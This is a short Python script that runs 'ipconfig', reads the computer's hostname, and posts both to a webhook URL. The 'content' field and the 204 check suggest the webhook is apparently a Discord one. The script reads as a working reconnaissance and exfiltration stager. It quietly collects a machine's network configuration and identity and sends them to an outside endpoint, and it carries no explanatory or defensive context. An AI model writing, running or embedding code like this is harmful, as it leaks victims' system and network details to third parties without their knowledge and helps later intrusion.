import subprocess
import requests
import socket
import json

hostname = socket.gethostname()

try:
    result = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
except subprocess.CalledProcessError as e:
    print(f"error while executing command {e}")
    exit(1)

webhook_url = 'webhook url'

data = {
    'content': f'pc name: {hostname}\n{result.stdout}'
}

headers = {
    'Content-Type': 'application/json'
}

try:
    response = requests.post(webhook_url, headers=headers, json=data)
except requests.RequestException as e:
    print(f"error sending request {e}")
    exit(1)

if response.status_code == 204:
    print('ready')
else:
    print(f'error on send{response.status_code}')
    print(f'{response.text}')

    